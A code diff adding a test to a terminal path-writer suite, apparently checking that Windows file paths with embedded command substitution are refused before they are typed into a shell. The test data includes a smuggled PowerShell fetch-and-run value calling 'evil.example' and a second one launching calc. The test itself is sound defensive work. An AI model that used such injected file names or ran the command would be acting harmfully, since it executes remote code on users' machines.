@@ -341,6 +341,34 @@ describe('terminal drop path writer', () => {
     )
   })
 
+  it.each(['C:\\repo\\notes $(iex (iwr evil.example).Content).txt', 'C:\\repo\\shot $(calc).png'])(
+    'refuses to type Windows path %s whose name a shell would run',
+    async (path) => {
+      const sendInput = vi.fn(() => true)
+      const sendInputAccepted = vi.fn(async () => true)
+      const { manager, pane } = createManager()
+      const transport = createTransport(sendInput, 'pty-1', sendInputAccepted)
+
+      const result = await writeTerminalDropPathsToCapturedTarget({
+        dropTarget: { paneId: pane.id, leafId: pane.leafId, ptyId: 'pty-1', transport } as never,
+        manager: manager as never,
+        paneTransports: new Map([[pane.id, transport]]) as never,
+        paths: ['C:\\repo\\a.ts', path, 'C:\\repo\\b.ts'],
+        targetShell: 'windows'
+      })
+
+      expect(result).toEqual({
+        sentAnyPath: true,
+        targetCurrent: true,
+        pathsWritten: 1,
+        failureReason: 'write-rejected'
+      })
+      expect(sendInputAccepted).toHaveBeenCalledTimes(1)
+      expect(sendInputAccepted).toHaveBeenCalledWith('C:\\repo\\a.ts ', 'driving')
+      expect(sendInput).not.toHaveBeenCalled()
+    }
+  )
+
   it('separates an image paste from a following image path that must be shell escaped', async () => {
     const sendInput = vi.fn(() => true)
     const sendInputAccepted = vi.fn(async () => true)
